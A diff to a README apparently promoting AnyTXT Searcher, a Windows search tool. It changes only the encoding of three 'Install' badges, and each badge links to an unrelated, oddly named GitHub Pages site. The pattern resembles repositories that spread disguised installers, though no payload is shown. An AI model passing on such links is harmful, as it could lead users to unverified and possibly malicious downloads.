@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install AnyTXT Searcher](https://img.shields.io/badge/⬇_Install_AnyTXT%20Searcher-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install AnyTXT Searcher](https://img.shields.io/badge/⬇_Install_AnyTXT+Searcher-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -81,7 +81,7 @@ AnyTXT Searcher is a free Windows desktop search tool that indexes and full-text
 
 <div align="center">
 
-[![⬇ Install AnyTXT Searcher](https://img.shields.io/badge/⬇_Install_AnyTXT%20Searcher-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install AnyTXT Searcher](https://img.shields.io/badge/⬇_Install_AnyTXT+Searcher-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -125,7 +125,7 @@ AnyTXT Searcher is a free Windows desktop search tool that indexes and full-text
 
 <div align="center">
 
-[![⬇ Install AnyTXT Searcher](https://img.shields.io/badge/⬇_Install_AnyTXT%20Searcher-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install AnyTXT Searcher](https://img.shields.io/badge/⬇_Install_AnyTXT+Searcher-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
